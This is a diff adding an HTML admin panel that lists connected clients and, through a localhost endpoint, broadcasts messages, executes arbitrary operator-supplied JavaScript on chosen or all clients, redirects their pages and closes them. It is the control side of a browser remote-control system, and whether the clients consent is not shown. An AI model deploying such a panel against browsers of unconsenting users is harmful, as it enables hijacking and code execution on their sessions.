@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Client Admin Panel</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; display: flex; height: 100vh; }
+    #sidebar {
+      width: 200px;
+      background-color: #f4f4f4;
+      border-right: 1px solid #ccc;
+      padding: 10px;
+    }
+    #sidebar button {
+      display: block;
+      width: 100%;
+      margin-bottom: 10px;
+    }
+    #content {
+      flex: 1;
+      padding: 20px;
+    }
+    .hidden { display: none; }
+    .client-entry { margin: 5px 0; }
+  </style>
+</head>
+<body>
+  <div id="sidebar">
+    <button onclick="showSection('clients')">View Clients</button>
+    <button onclick="showSection('broadcast')">Broadcast</button>
+    <button onclick="showSection('commands')">Execute Code</button>
+    <button onclick="showSection('navigation')">Set Page</button>
+    <button onclick="showSection('closeClients')">Close Clients</button>
+    <button onclick="closeAllClients()">Close All Clients</button>
+  </div>
+
+  <div id="content">
+    <div id="clients" class="section">
+      <h2>Connected Clients</h2>
+      <button onclick="fetchClients()">Refresh</button>
+      <div id="clientList"></div>
+    </div>
+
+    <div id="broadcast" class="section hidden">
+      <h2>Broadcast Message</h2>
+      <textarea id="broadcastMessage" rows="3" cols="50" placeholder="Enter message to broadcast..."></textarea><br>
+      <input type="text" id="targetClientsBroadcast" placeholder="Target IDs (comma-separated or 'all')" /><br>
+      <button onclick="broadcastMessage()">Send</button>
+    </div>
+
+    <div id="commands" class="section hidden">
+      <h2>Execute Code on Clients</h2>
+      <textarea id="execCode" rows="4" cols="60" placeholder="JavaScript code to execute..."></textarea><br>
+      <input type="text" id="targetClientsExec" placeholder="Target IDs (comma-separated or 'all')" /><br>
+      <button onclick="executeCode()">Execute</button>
+    </div>
+
+    <div id="navigation" class="section hidden">
+      <h2>Change Client Page</h2>
+      <input type="text" id="newHref" placeholder="Enter new window.location.href" /><br>
+      <input type="text" id="targetClientsNav" placeholder="Target IDs (comma-separated or 'all')" /><br>
+      <button onclick="setClientHref()">Send</button>
+    </div>
+
+    <div id="closeClients" class="section hidden">
+      <h2>Close Specific Clients</h2>
+      <input type="text" id="targetClientsClose" placeholder="Target IDs (comma-separated)" /><br>
+      <button onclick="closeClients()">Close Selected</button>
+    </div>
+  </div>
+
+  <script>
+    const dataUrl = "http://localhost/data"
+
+    function showSection(id) {
+      document.querySelectorAll('.section').forEach(sec => sec.classList.add('hidden'));
+      document.getElementById(id).classList.remove('hidden');
+    }
+
+    function sendData(data) {
+      fetch(dataUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data),
+      })
+      .then(res => res.json())
+      .then(data => console.log(data))
+      .catch(err => console.error("Request failed:", err));
+    }
+
+    function closeAllClients() {
+      sendData({ type: "closeAllClients" });
+    }
+
+    function fetchClients() {
+      fetch(dataUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "fetchClients" }),
+      })
+      .then(res => res.json())
+      .then(data => {
+        const list = document.getElementById("clientList");
+        list.innerHTML = "";
+        data.clients.forEach(client => {
+          const el = document.createElement("div");
+          el.className = "client-entry";
+          el.textContent = `ID: ${client.id}, URL: ${client.url || "none"}, Connected: ${client.connected}`;
+          list.appendChild(el);
+        });
+      })
+      .catch(err => console.error("Failed to fetch clients:", err));
+    }
+
+    function broadcastMessage() {
+      const message = document.getElementById("broadcastMessage").value;
+      const targets = document.getElementById("targetClientsBroadcast").value;
+      const targetIds = targets.trim() === "all" ? "all" : targets.split(',').map(id => id.trim());
+      sendData({ type: "broadcastMessage", message, targets: targetIds });
+    }
+
+    function executeCode() {
+      const code = document.getElementById("execCode").value;
+      const targets = document.getElementById("targetClientsExec").value;
+      const targetIds = targets.trim() === "all" ? "all" : targets.split(',').map(id => id.trim());
+      sendData({ type: "execCode", code, targets: targetIds });
+    }
+
+    function setClientHref() {
+      const url = document.getElementById("newHref").value;
+      const targets = document.getElementById("targetClientsNav").value;
+      const targetIds = targets.trim() === "all" ? "all" : targets.split(',').map(id => id.trim());
+      sendData({ type: "setHref", url, targets: targetIds });
+    }
+
+    function closeClients() {
+      const targets = document.getElementById("targetClientsClose").value;
+      const targetIds = targets.trim().split(',').map(id => id.trim());
+      sendData({ type: "closeClients", targets: targetIds });
+    }
+
+    // Auto-load client list on start
+    fetchClients();
+  </script>
+</body>
+</html>
